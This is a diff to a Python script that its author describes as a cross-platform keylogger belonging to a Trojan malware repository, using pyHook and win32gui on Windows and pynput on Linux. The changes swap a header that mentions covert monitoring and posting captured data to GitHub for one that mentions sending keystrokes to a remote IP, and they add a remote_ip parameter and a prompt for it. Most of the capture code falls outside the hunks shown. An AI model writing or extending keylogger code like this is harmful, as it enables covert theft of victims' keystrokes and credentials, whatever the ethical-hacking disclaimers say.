@@ -2,27 +2,15 @@
 #################################################################################################
 # Author: Nicholas Fisher
 # Date: March 5th 2024
-# Important Note:
-#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
-# these scripts. They are malicious and should only be used in professionally approved White Hat 
-# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
-# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
-# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
-# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
-# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
-# and if that repository is public, all the extracted data will be available for the whole world to see.
-# Description of Script
-# This script implements a cross-platform keylogger capable of logging keyboard inputs on both Windows
-# and Linux operating systems. It utilizes different libraries and modules depending on the platform, 
-# using pyHook for Windows and pynput for Linux. The script continuously monitors keyboard events, 
-# logging all key inputs, including printable characters and special keys, while also identifying 
-# the active window or process where the input is directed. To use the script, simply run it on the 
-# target system, and it will start logging keystrokes in the background. An example usage scenario 
-# would involve running the script discreetly on a system to monitor user activity for security or 
-# administrative purposes. The script output includes the logged keys along with details such as 
-$# the process ID, executable name, and window title where the input occurred. For instance, 
-# the output might display characters typed in a text editor along with information about 
-# the editor's process and window title, providing context for the logged keystrokes.
+# This script implements a keylogger, a tool designed to capture keystrokes on a 
+# target system. The script is platform-independent, capable of running on both Windows and 
+# Linux operating systems. Upon execution, the user is prompted to input a remote target IP 
+# address where the captured keystrokes will be sent. Once the IP address is provided, the 
+# keylogger begins monitoring keyboard input in the foreground, logging each keystroke along
+# with details about the active window. For Windows systems, it utilizes modules like `pyHook`
+# and `win32gui` to capture keyboard events, while for Linux systems, it employs `pynput`. 
+# This script is designed for ethical hacking scenarios, aiding in penetration testing on 
+# approved systems within legal boundaries.
 #################################################################################################
 import platform
 import os
@@ -48,9 +36,10 @@ TIMEOUT = 60*10
 # Define the KeyLogger class
 class KeyLogger:
     # Initialize the KeyLogger class
-    def __init__(self):
+    def __init__(self, remote_ip):
         # Initialize the current_window attribute
         self.current_window = None
+        self.remote_ip = remote_ip
 
     # Method to get the current process running in the foreground window
     def get_current_process(self, hwnd):
@@ -134,7 +123,10 @@ class KeyLogger:
 
 # Entry point of the script
 if __name__ == "__main__":
-    # Create an instance of the KeyLogger class
-    keylogger = KeyLogger()
+    # Prompt the user to input the remote target IP address
+    remote_ip = input("Enter the remote target IP address: ")
+    # Create an instance of the KeyLogger class with the remote IP
+    keylogger = KeyLogger(remote_ip)
     # Start the keylogger
     keylogger.start_keylogger()
+
